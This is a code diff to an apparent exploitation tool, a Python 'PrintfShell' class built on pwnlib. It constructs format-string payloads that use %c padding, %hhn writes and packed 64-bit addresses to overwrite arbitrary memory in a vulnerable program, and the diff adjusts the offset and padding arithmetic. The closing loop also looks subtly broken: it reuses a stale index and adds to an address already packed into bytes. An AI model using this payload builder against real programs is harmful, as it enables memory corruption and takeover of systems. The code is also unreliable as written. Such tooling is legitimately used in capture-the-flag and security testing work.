@@ -2,6 +2,8 @@ import shell
 import pwnlib
 import re
 
+import math
+
 from shell import Command
 
 import logging
@@ -140,16 +142,16 @@ class PrintfShell(shell.Shell):
         if type(addr) == str:
             addr = int(addr, 16)
         count = 0
-        total = len(bs)
+        total = 2*len(bs)
         command = ""
         for i, n in enumerate(bs):
-            nw = (n - count) % 256
-            if nw != 0:
-                command += f"%{nw}d%{self.stack_offset+1+total+i}$hhn"
+            spill = (n - count) % 256
+            if spill != 0:
+                command += f"%1${spill}c%{self.stack_offset+total+i}$hhn"
             else: 
-                command += f"d%{self.stack_offset+1+total+total+i}$hhn"
+                command += f"%{self.stack_offset+total+i}$hhn"
             count = n
-        command = self.pad(command, (1+total)*16, b"_") # TODO: figure out the whole sep char
+        command = self.pad(command, (total)*8, b"_") # TODO: figure out the whole sep char
         for n in enumerate(bs):
             addr = pwnlib.util.packing.p64(addr + i)
             command += addr
